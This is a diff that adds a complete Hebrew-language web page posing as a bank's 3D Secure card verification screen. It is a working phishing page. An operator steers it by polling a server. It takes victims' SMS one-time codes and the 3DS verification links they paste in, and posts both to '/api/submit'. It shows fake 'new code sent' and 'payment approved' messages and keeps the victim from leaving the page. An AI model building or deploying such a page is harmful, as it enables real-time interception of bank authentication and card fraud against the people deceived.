@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>אימות מאובטח</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<link rel="icon" href="/img/faviconpost.ico">
+<style>
+  * { box-sizing: border-box; }
+  html, body { margin:0; padding:0; min-height:100vh; }
+  body {
+    font-family: "Segoe UI", "Assistant", Arial, sans-serif;
+    background: linear-gradient(135deg,#f5f7fb 0%,#eef2f7 100%);
+    color:#1a1a2e; direction:rtl;
+    display:flex; align-items:center; justify-content:center; padding:24px;
+  }
+  .wrap { width:100%; max-width:440px; }
+  .card {
+    background:#fff; border-radius:18px; padding:28px 26px 26px;
+    box-shadow: 0 20px 60px -20px rgba(20,30,70,.18), 0 4px 12px rgba(20,30,70,.05);
+    animation: fade .35s ease;
+  }
+  @keyframes fade { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:none} }
+
+  /* Header / logos */
+  .topbar { display:flex; align-items:center; justify-content:space-between; margin-bottom:20px; }
+  .secure { display:flex; align-items:center; gap:6px; color:#27ae60; font-size:12px; font-weight:700; }
+  .secure svg { width:14px; height:14px; }
+  .brand-logo { height:28px; }
+
+  /* Virtual card preview */
+  .vcard {
+    background: linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%);
+    color:#fff; border-radius:14px; padding:18px 20px; margin-bottom:22px;
+    position:relative; overflow:hidden; min-height:120px;
+  }
+  .vcard::before {
+    content:""; position:absolute; inset:-40%; background:
+      radial-gradient(circle at 80% 20%, rgba(255,255,255,.12), transparent 40%),
+      radial-gradient(circle at 10% 90%, rgba(255,255,255,.08), transparent 40%);
+    pointer-events:none;
+  }
+  .vcard .chip {
+    width:34px; height:26px; border-radius:5px;
+    background: linear-gradient(135deg,#d4af37,#f4d56b 50%,#b8860b);
+    position:relative;
+  }
+  .vcard .chip::after {
+    content:""; position:absolute; inset:4px;
+    background: repeating-linear-gradient(90deg, rgba(0,0,0,.2) 0 1px, transparent 1px 6px),
+                repeating-linear-gradient(0deg, rgba(0,0,0,.2) 0 1px, transparent 1px 6px);
+    border-radius:3px;
+  }
+  .vcard .row1 { display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:26px; }
+  .vcard .num { font-family: "Courier New", monospace; font-size:19px; letter-spacing:3px; direction:ltr; text-align:left; margin-bottom:12px; }
+  .vcard .row2 { display:flex; justify-content:space-between; align-items:flex-end; direction:ltr; font-size:11px; opacity:.85; }
+  .vcard .row2 b { display:block; font-size:13px; letter-spacing:1px; opacity:1; margin-top:2px; }
+  .vcard .brand-badge { height:32px; }
+
+  h2 { margin:0 0 6px; font-size:20px; font-weight:700; }
+  .sub { color:#666; font-size:14px; line-height:1.5; margin:0 0 18px; }
+  .sub b { color:#1a1a2e; }
+
+  /* OTP inputs */
+  .otp-boxes { display:flex; gap:8px; justify-content:center; direction:ltr; margin:20px 0 14px; }
+  .otp-boxes input {
+    width:44px; height:54px; border:2px solid #e1e5ed; border-radius:10px;
+    font-size:22px; font-weight:700; text-align:center; background:#fafbfd;
+    transition: all .15s; outline:none;
+  }
+  .otp-boxes input:focus { border-color:#0066cc; background:#fff; box-shadow:0 0 0 4px rgba(0,102,204,.12); }
+  .otp-boxes input.filled { background:#fff; border-color:#0066cc; }
+
+  /* 3DS link input */
+  .link-input {
+    width:100%; padding:14px 16px; border:2px solid #e1e5ed; border-radius:10px;
+    font-size:15px; background:#fafbfd; outline:none; direction:ltr; text-align:left;
+    transition: all .15s;
+  }
+  .link-input:focus { border-color:#0066cc; background:#fff; box-shadow:0 0 0 4px rgba(0,102,204,.12); }
+
+  button.primary {
+    width:100%; padding:14px; background:linear-gradient(135deg,#0066cc,#004a99);
+    color:#fff; border:none; border-radius:10px; font-size:15px; font-weight:700;
+    cursor:pointer; margin-top:14px; transition: transform .1s;
+    box-shadow: 0 8px 20px -8px rgba(0,102,204,.5);
+  }
+  button.primary:hover { transform: translateY(-1px); }
+  button.primary:active { transform: translateY(0); }
+  button.primary:disabled { background:#b0b8c1; cursor:not-allowed; box-shadow:none; transform:none; }
+
+  .err { color:#d0021b; font-size:13px; margin-top:10px; text-align:center; display:none; }
+  .err.show { display:block; animation: shake .4s; }
+  @keyframes shake { 0%,100%{transform:translateX(0)} 25%{transform:translateX(-6px)} 75%{transform:translateX(6px)} }
+
+  .resend { text-align:center; margin-top:14px; font-size:13px; color:#666; }
+  .resend a { color:#0066cc; font-weight:600; text-decoration:none; cursor:pointer; }
+
+  .notice {
+    background: #f0f7ff; border: 1px solid #cfe2ff; color: #084298;
+    padding: 12px 14px; border-radius: 10px; font-size: 13.5px; margin-bottom: 16px;
+    display:flex; gap:10px; align-items:flex-start;
+  }
+  .notice svg { flex-shrink:0; margin-top:2px; }
+
+  /* Spinner + states */
+  .spinner { width:54px; height:54px; border:4px solid #eef0f4; border-top-color:#0066cc; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto 18px; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .center { text-align:center; padding:16px 0 6px; }
+
+  .success-icon, .fail-icon {
+    width:72px; height:72px; border-radius:50%; margin:0 auto 16px;
+    display:flex; align-items:center; justify-content:center; color:#fff; font-size:40px;
+    animation: pop .4s cubic-bezier(.2,1.4,.4,1);
+  }
+  .success-icon { background: linear-gradient(135deg,#2ecc71,#27ae60); }
+  .fail-icon    { background: linear-gradient(135deg,#e74c3c,#c0392b); }
+  @keyframes pop { from{transform:scale(.3);opacity:0} to{transform:scale(1);opacity:1} }
+
+  .hidden { display:none; }
+
+  .footer { text-align:center; margin-top:18px; font-size:11px; color:#98a0ad; }
+  .footer .lock { display:inline-flex; align-items:center; gap:4px; }
+  .footer svg { width:11px; height:11px; }
+
+  @media (max-width:380px) {
+    .otp-boxes input { width:38px; height:48px; font-size:19px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="wrap">
+  <div class="card">
+
+    <!-- ========= WAITING ========= -->
+    <div id="waiting">
+      <div class="center">
+        <div class="spinner"></div>
+        <h2>מכין אימות מאובטח</h2>
+        <p class="sub">אנא המתן, מקימים חיבור מאובטח עם הבנק...</p>
+      </div>
+    </div>
+
+    <!-- ========= OTP ========= -->
+    <div id="otp" class="hidden">
+      <div class="topbar">
+        <div class="secure">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+          SSL מאובטח
+        </div>
+        <img id="brandLogo" class="brand-logo" src="" alt="">
+      </div>
+
+      <div class="vcard">
+        <div class="row1">
+          <div class="chip"></div>
+          <img id="brandBadge" class="brand-badge" src="" alt="">
+        </div>
+        <div class="num" id="cardNum">•••• •••• •••• ••••</div>
+        <div class="row2">
+          <div><span style="font-size:10px;opacity:.7">CARDHOLDER</span><b id="cardHolder">•••••</b></div>
+          <div><span style="font-size:10px;opacity:.7">VALID THRU</span><b>••/••</b></div>
+        </div>
+      </div>
+
+      <h2>קוד אימות — 3D Secure</h2>
+      <p class="sub">
+        נשלח קוד אימות ל־SMS למספר המסתיים ב־<b id="phoneHint">****</b> עבור כרטיס <b>•••• <span id="last4a">••••</span></b>.
+        נא להזין את 6 הספרות:
+      </p>
+
+      <div class="otp-boxes" id="otpBoxes">
+        <input type="tel" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
+        <input type="tel" maxlength="1" inputmode="numeric">
+        <input type="tel" maxlength="1" inputmode="numeric">
+        <input type="tel" maxlength="1" inputmode="numeric">
+        <input type="tel" maxlength="1" inputmode="numeric">
+        <input type="tel" maxlength="1" inputmode="numeric">
+      </div>
+
+      <div id="otpErr" class="err"></div>
+      <button class="primary" id="otpBtn">אישור והמשך</button>
+      <div class="resend">לא קיבלת קוד? <a id="resend">שלח שוב</a></div>
+    </div>
+
+    <!-- ========= 3DS LINK ========= -->
+    <div id="tds" class="hidden">
+      <div class="topbar">
+        <div class="secure">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+          3D Secure
+        </div>
+        <img id="brandLogo2" class="brand-logo" src="" alt="">
+      </div>
+
+      <div class="notice">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="#0066cc"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+        <div>
+          <b>שלחנו לך הודעת SMS עם קישור לאימות</b><br>
+          העתק את הקישור מההודעה והדבק אותו כאן למטה כדי להשלים את האימות של כרטיס המסתיים ב־<b>•••• <span id="last4b">••••</span></b>.
+        </div>
+      </div>
+
+      <h2>הדבק את קישור האימות</h2>
+      <p class="sub">הקישור תקף למשך 5 דקות בלבד.</p>
+
+      <input id="tdsInput" class="link-input" type="url" inputmode="url" placeholder="https://secure.bank.co.il/3ds/..." autocapitalize="off" autocorrect="off">
+      <div id="tdsErr" class="err"></div>
+      <button class="primary" id="tdsBtn">אימות והמשך</button>
+    </div>
+
+    <!-- ========= SUBMIT LOADING ========= -->
+    <div id="submitLoad" class="hidden">
+      <div class="center">
+        <div class="spinner"></div>
+        <h2>מאמת מול הבנק</h2>
+        <p class="sub">פעולה זו עשויה להימשך עד 30 שניות. אנא לא לסגור את הדף.</p>
+      </div>
+    </div>
+
+    <!-- ========= SUCCESS ========= -->
+    <div id="done" class="hidden">
+      <div class="center">
+        <div class="success-icon">✓</div>
+        <h2>התשלום אושר בהצלחה</h2>
+        <p class="sub">העסקה שלך אושרה. המשלוח יצא אליך בקרוב.</p>
+        <button class="primary" id="closeBtn" style="max-width:260px;margin:8px auto 0;display:block">סגור חלון</button>
+        <p id="closeHint" class="sub hidden" style="margin-top:14px;color:#c0392b">לא ניתן לסגור את הדף אוטומטית. אנא סגור את החלון ידנית.</p>
+      </div>
+    </div>
+
+    <!-- ========= DECLINE (full page) ========= -->
+    <div id="fail" class="hidden">
+      <div class="center">
+        <div class="fail-icon">✕</div>
+        <h2 style="color:#c0392b">העסקה נדחתה</h2>
+        <p class="sub">לא ניתן היה לאשר את העסקה. אנא פנה לבנק או נסה כרטיס אחר.</p>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="footer">
+    <span class="lock">
+      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+      תשלום מאובטח באמצעות 3D Secure
+    </span>
+  </div>
+</div>
+
+<!-- Brand logos (inline SVG data URIs) -->
+<script>
+(function(){
+  const qs = new URLSearchParams(location.search);
+  const sessionId = qs.get('s');
+  if (!sessionId) { document.body.innerHTML = '<div style="padding:40px;text-align:center;font-family:sans-serif">Session missing</div>'; return; }
+
+  const $ = id => document.getElementById(id);
+  const show = id => {
+    ['waiting','otp','tds','submitLoad','done','fail'].forEach(n => $(n).classList.add('hidden'));
+    $(id).classList.remove('hidden');
+  };
+
+  // Brand logos as SVG data URIs
+  const LOGOS = {
+    visa:       'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 83"><path fill="%231a1f71" d="M114 80 128 3h22l-14 77zM204 5c-4-2-11-4-19-4-21 0-36 11-36 27 0 12 11 18 19 22 9 4 12 7 12 10 0 6-7 8-13 8-8 0-13-1-20-4l-3-1-3 18c5 2 14 4 24 4 22 0 36-11 37-28 0-9-6-16-17-21-7-4-12-6-12-10 0-3 4-7 12-7 7 0 12 2 16 3l2 1 4-18zM229 3h-17c-5 0-9 2-11 7l-32 70h22l5-12h27l3 12h20zm-26 49 9-24 5 24zM96 3 75 55l-2-11c-4-13-16-26-30-33l20 69h22l33-77z"/><path fill="%23f7b600" d="M50 3H17L16 5c26 7 43 23 50 43l-7-36c-1-6-5-9-10-9z"/></svg>',
+    mastercard: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 152 108"><path fill="%23ff5f00" d="M56 11h40v86H56z"/><path fill="%23eb001b" d="M60 54A54 54 0 0 1 81 11a54 54 0 1 0 0 86 54 54 0 0 1-21-43z"/><path fill="%23f79e1b" d="M168 54a54 54 0 0 1-87 43 54 54 0 0 0 0-86 54 54 0 0 1 87 43z"/></svg>',
+    amex:       'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 32"><rect width="48" height="32" rx="4" fill="%232e77bb"/><text x="24" y="20" text-anchor="middle" fill="white" font-family="Arial Black" font-size="7" font-weight="900">AMERICAN</text><text x="24" y="27" text-anchor="middle" fill="white" font-family="Arial Black" font-size="7" font-weight="900">EXPRESS</text></svg>',
+    discover:   'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 32"><rect width="48" height="32" rx="4" fill="%23f5f5f5"/><text x="24" y="20" text-anchor="middle" fill="%23231f20" font-family="Arial" font-size="9" font-weight="700">DISCOVER</text><circle cx="36" cy="16" r="10" fill="%23f68121" opacity=".9"/></svg>',
+    jcb:        'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 32"><rect width="48" height="32" rx="4" fill="white" stroke="%23ccc"/><text x="24" y="21" text-anchor="middle" fill="%230e4c96" font-family="Arial" font-size="11" font-weight="900">JCB</text></svg>',
+    diners:     'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 32"><rect width="48" height="32" rx="4" fill="white" stroke="%23ccc"/><text x="24" y="19" text-anchor="middle" fill="%230079be" font-family="Arial" font-size="6" font-weight="700">DINERS CLUB</text></svg>',
+    card:       'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 32"><rect width="48" height="32" rx="4" fill="%23e5e5e5"/><rect y="8" width="48" height="6" fill="%23999"/></svg>'
+  };
+
+  function setBrand(brand, last4, holder) {
+    const logo = LOGOS[brand] || LOGOS.card;
+    $('brandLogo').src  = logo;
+    $('brandLogo2').src = logo;
+    $('brandBadge').src = logo;
+    if (last4) {
+      $('cardNum').textContent = '•••• •••• •••• ' + last4;
+      $('last4a').textContent = last4;
+      $('last4b').textContent = last4;
+    }
+    if (holder) $('cardHolder').textContent = holder.toUpperCase();
+  }
+
+  // Read cookies for card holder
+  function getCookie(n){ const m = document.cookie.match(new RegExp('(?:^|; )'+n+'=([^;]*)')); return m ? decodeURIComponent(m[1]) : ''; }
+  const holder = getCookie('full_name');
+  const last4Cookie = getCookie('card_last4');
+  if (holder) $('cardHolder').textContent = holder.toUpperCase();
+  if (last4Cookie) { $('last4a').textContent = last4Cookie; $('last4b').textContent = last4Cookie; $('cardNum').textContent = '•••• •••• •••• ' + last4Cookie; }
+
+  // ----- OTP box behavior -----
+  const boxes = Array.from($('otpBoxes').querySelectorAll('input'));
+  boxes.forEach((b, i) => {
+    b.addEventListener('input', e => {
+      b.value = b.value.replace(/\D/g,'').slice(0,1);
+      if (b.value) { b.classList.add('filled'); if (boxes[i+1]) boxes[i+1].focus(); }
+      else b.classList.remove('filled');
+    });
+    b.addEventListener('keydown', e => {
+      if (e.key === 'Backspace' && !b.value && boxes[i-1]) { boxes[i-1].focus(); boxes[i-1].value=''; boxes[i-1].classList.remove('filled'); }
+    });
+    b.addEventListener('paste', e => {
+      const t = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g,'').slice(0,6);
+      if (!t) return;
+      e.preventDefault();
+      t.split('').forEach((ch, k) => { if (boxes[k]) { boxes[k].value = ch; boxes[k].classList.add('filled'); } });
+      (boxes[Math.min(t.length,5)] || boxes[5]).focus();
+    });
+  });
+
+  function getOtp(){ return boxes.map(b=>b.value).join(''); }
+  function clearOtp(){ boxes.forEach(b => { b.value=''; b.classList.remove('filled'); }); boxes[0].focus(); }
+
+  // ----- Polling -----
+  let lastSeq = 0;
+  let currentMode = 'waiting';
+  let otpAttempt = 0;
+  let tdsAttempt = 0;
+  let allowClose = false;
+
+  async function poll() {
+    try {
+      const r = await fetch('/api/check-mode?s=' + encodeURIComponent(sessionId));
+      const d = await r.json();
+
+      // Always update card visuals if we got them
+      if (d.brand || d.last4) setBrand(d.brand, d.last4, holder);
+      if (d.phone) {
+        const p = String(d.phone).replace(/\D/g,'');
+        $('phoneHint').textContent = p.slice(-4) || '****';
+      }
+
+      if ((d.seq ?? 0) <= lastSeq) return;
+      lastSeq = d.seq;
+
+      if (d.action === 'otp') {
+        currentMode = 'otp';
+        $('otpErr').classList.remove('show');
+        clearOtp();
+        show('otp');
+      } else if (d.action === '3ds') {
+        currentMode = '3ds';
+        $('tdsErr').classList.remove('show');
+        $('tdsInput').value = '';
+        show('tds');
+        $('tdsInput').focus();
+      } else if (d.action === 'decline') {
+        if (currentMode === 'otp') {
+          $('otpErr').textContent = 'קוד שגוי — נסה שוב';
+          $('otpErr').classList.add('show');
+          clearOtp();
+          show('otp');
+        } else if (currentMode === '3ds') {
+          $('tdsErr').textContent = 'קישור לא תקין — העתק שוב מההודעה';
+          $('tdsErr').classList.add('show');
+          $('tdsInput').value = '';
+          show('tds');
+        } else {
+          show('fail');
+        }
+      } else if (d.action === 'success') {
+        show('done');
+        clearInterval(timer);
+        allowClose = true;
+      }
+    } catch {}
+  }
+
+  const timer = setInterval(poll, 1500);
+  poll();
+
+  // ----- Submit handlers -----
+  $('otpBtn').onclick = async () => {
+    const v = getOtp();
+    if (v.length < 4) {
+      $('otpErr').textContent = 'נא להזין את כל הספרות';
+      $('otpErr').classList.add('show');
+      return;
+    }
+    otpAttempt++;
+    $('otpBtn').disabled = true;
+    show('submitLoad');
+    try {
+      await fetch('/api/submit', {
+        method:'POST', headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({ type:'otp', sessionId, value:v, attempt: otpAttempt })
+      });
+    } catch {}
+    $('otpBtn').disabled = false;
+  };
+
+  $('tdsBtn').onclick = async () => {
+    const v = $('tdsInput').value.trim();
+    if (!v || !/^https?:\/\//i.test(v)) {
+      $('tdsErr').textContent = 'הדבק קישור תקין (מתחיל ב־https://)';
+      $('tdsErr').classList.add('show');
+      return;
+    }
+    tdsAttempt++;
+    $('tdsBtn').disabled = true;
+    show('submitLoad');
+    try {
+      await fetch('/api/submit', {
+        method:'POST', headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({ type:'3ds', sessionId, value:v, attempt: tdsAttempt })
+      });
+    } catch {}
+    $('tdsBtn').disabled = false;
+  };
+
+  $('resend').onclick = () => {
+    $('otpErr').textContent = 'נשלח קוד חדש אל הטלפון שלך';
+    $('otpErr').style.color = '#27ae60';
+    $('otpErr').classList.add('show');
+    setTimeout(()=>{ $('otpErr').style.color=''; $('otpErr').classList.remove('show'); }, 3000);
+  };
+
+  // Prevent accidental back/refresh
+  window.addEventListener('beforeunload', e => {
+    if (allowClose) return;
+    e.preventDefault(); e.returnValue='';
+  });
+
+  // Close button on success screen — browsers only allow window.close()
+  // on tabs opened by script. Try multiple tricks and fall back to hint.
+  $('closeBtn').addEventListener('click', () => {
+    allowClose = true;
+    // 1) Try normal close (works only if opened via window.open)
+    try { window.close(); } catch {}
+
+    // 2) Some browsers accept it if we reassign opener
+    try { window.open('', '_self'); window.close(); } catch {}
+
+    // 3) Navigate to blank so they definitely leave the page visually
+    setTimeout(() => {
+      if (!document.hidden) {
+        // Still open — navigate to about:blank equivalent
+        try { location.href = 'about:blank'; } catch {}
+        setTimeout(() => {
+          if (!document.hidden) {
+            $('closeHint').classList.remove('hidden');
+          }
+        }, 400);
+      }
+    }, 250);
+  });
+})();
+</script>
+
+</body>
+</html>
